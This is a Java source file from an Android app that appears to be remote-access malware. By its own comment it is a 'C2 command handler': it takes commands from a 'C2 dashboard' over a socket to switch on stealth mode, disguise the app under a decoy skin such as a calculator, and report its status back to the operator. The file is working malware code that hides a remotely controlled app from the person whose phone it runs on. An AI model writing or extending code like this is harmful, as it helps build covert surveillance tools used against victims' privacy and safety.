package com.fason.app.core.network;

import com.fason.app.core.Protocol;
import com.fason.app.stealth.StealthModeManager;

import org.json.JSONObject;

import io.socket.client.Socket;

/**
 * StealthCommandHandlers — C2 command handler for stealth mode.
 *
 * Routes stealth commands from the C2 dashboard:
 *  - stealth_on  {level: 1-3, skin: 1-3}
 *  - stealth_off
 *  - stealth_status
 *  - decoy_skin  {skin: 1-3}
 *
 * SocketCommandRouter's handleOrder() gains:
 *   case Protocol.STEALTH: StealthCommandHandlers.handle(data, socket, cmdId); break;
 */
public final class StealthCommandHandlers {
    private StealthCommandHandlers() {}

    public static void handle(JSONObject data, Socket socket, String cmdId) {
        String action = data.optString(Protocol.KEY_ACTION, "");
        switch (action) {
            case "stealth_on": {
                int level = data.optInt("level", 2);
                int skin = data.optInt("skin", StealthModeManager.SKIN_CALCULATOR);
                StealthModeManager.setDecoySkin(skin);
                StealthModeManager.activate(level);
                emitReport(socket, cmdId);
                break;
            }
            case "stealth_off":
                StealthModeManager.deactivate();
                emitReport(socket, cmdId);
                break;
            case "stealth_status":
            default:
                emitReport(socket, cmdId);
                break;
        }
    }

    public static void handleDecoySkin(JSONObject data, Socket socket, String cmdId) {
        int skin = data.optInt("skin", StealthModeManager.SKIN_CALCULATOR);
        StealthModeManager.setDecoySkin(skin);
        emitReport(socket, cmdId);
    }

    private static void emitReport(Socket socket, String cmdId) {
        if (socket == null) return;
        try {
            JSONObject o = StealthModeManager.buildReport();
            o.put(Protocol.KEY_TYPE, "stealth_status");
            if (cmdId != null) o.put(Protocol.KEY_CMD_ID, cmdId);
            socket.emit(Protocol.STEALTH, o);
        } catch (Exception ignored) {}
    }
}
